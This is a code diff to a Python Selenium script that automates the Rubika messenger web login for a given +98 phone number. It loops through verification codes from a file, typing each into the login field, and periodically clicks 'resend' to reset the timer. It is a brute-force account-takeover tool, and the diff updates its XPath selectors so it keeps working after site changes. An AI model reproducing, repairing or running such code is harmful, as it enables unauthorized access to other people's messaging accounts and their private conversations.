@@ -21,22 +21,20 @@ def Rubika():
     drive=wb.Firefox()
     drive.get('https://web.rubika.ir/#/login')
     time.sleep(2)
-    drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[2]/form/div[2]/div[2]/input').send_keys(Number_CellPhone)
-    drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[1]/div/a').click()
+    drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[1]/div/div[3]/div[3]/input[1]').send_keys(Number_CellPhone)
+    drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[1]/div/div[3]/button/div/div').click()
     time.sleep(.3)
-    drive.find_element_by_xpath('/html/body/div/app-root/app-modal-container/div/app-modal-view/div/div/div/app-confirm-custom/div/div[2]/button[2]/span').click()
     stop=time.time()+61
-    time.sleep(2)
     with open('./pass.txt','r') as passlist:
         for i in passlist.read().split():
             if stop<=time.time():
                 stop=time.time()+60
-                drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[2]/form/div[3]/p/a/span').click()
+                drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[3]/p/a/span').click()
                 time.sleep(.1)
                 print('\n\n         >>>>>>   UPDATE   TIME  <<<<<<\n\n')
 
             print(f'\n\n\n                      TEST CODE {i} ON  +98{Number_CellPhone}')
-            drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[2]/form/div[4]/input').send_keys(str(i))
+            drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').send_keys(str(i))
             time.sleep(.001)
-            drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[2]/form/div[4]/input').clear()
+            drive.find_element_by_xpath('/html/body/app-root/tab-login/div/div/div[2]/div[2]/div/div[4]/div/input').clear()
 Rubika()
